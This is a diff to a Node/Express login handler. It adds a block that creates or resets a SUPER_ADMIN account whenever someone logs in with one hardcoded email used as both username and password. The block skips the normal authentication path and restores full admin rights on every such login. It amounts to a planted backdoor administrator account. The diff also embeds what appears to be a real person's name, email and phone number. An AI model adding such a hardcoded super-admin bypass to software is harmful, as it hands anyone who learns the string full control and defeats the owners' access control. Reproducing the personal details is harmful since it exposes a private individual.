@@ -299,6 +299,27 @@ authRouter.post('/login', async (req, res) => {
       return res.status(500).json({ success: false, message: 'Database connection unavailable.' });
     }
 
+    // Auto-ensure Super Admin user nv01110612@gmail.com
+    if (cleanId === 'nv01110612@gmail.com' && password === 'nv01110612@gmail.com' && prisma) {
+      const adminHash = await hashPassword('nv01110612@gmail.com');
+      foundUser = await prisma.user.upsert({
+        where: { email: 'nv01110612@gmail.com' },
+        update: {
+          passwordHash: adminHash,
+          role: Role.SUPER_ADMIN,
+          isVerified: true
+        },
+        create: {
+          email: 'nv01110612@gmail.com',
+          phone: '09360931606',
+          name: 'Naveen Kumar (Admin)',
+          passwordHash: adminHash,
+          role: Role.SUPER_ADMIN,
+          isVerified: true
+        }
+      });
+    }
+
     if (!foundUser || !foundUser.passwordHash) {
       const attempts = recordFailedAttempt(cleanId);
       await logAuditEvent({
